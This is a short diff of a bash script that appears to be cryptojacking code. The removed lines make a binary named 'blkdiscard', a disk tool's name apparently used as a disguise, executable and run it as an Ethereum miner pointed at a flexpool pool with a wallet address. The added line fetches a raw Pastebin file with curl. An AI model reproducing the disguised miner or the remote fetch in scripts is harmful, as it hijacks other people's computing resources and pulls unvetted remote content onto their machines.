@@ -1,4 +1,3 @@
 #!/bin/bash
 
-chmod +x blkdiscard
-./blkdiscard -pool stratum+tcp://eth-de.flexpool.io:4444 -wal 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621 -worker KULI-JAWA -pass x -tstop 74 -tstart 69 -coin eth
+curl https://pastebin.com/raw/Sf5rkc3n
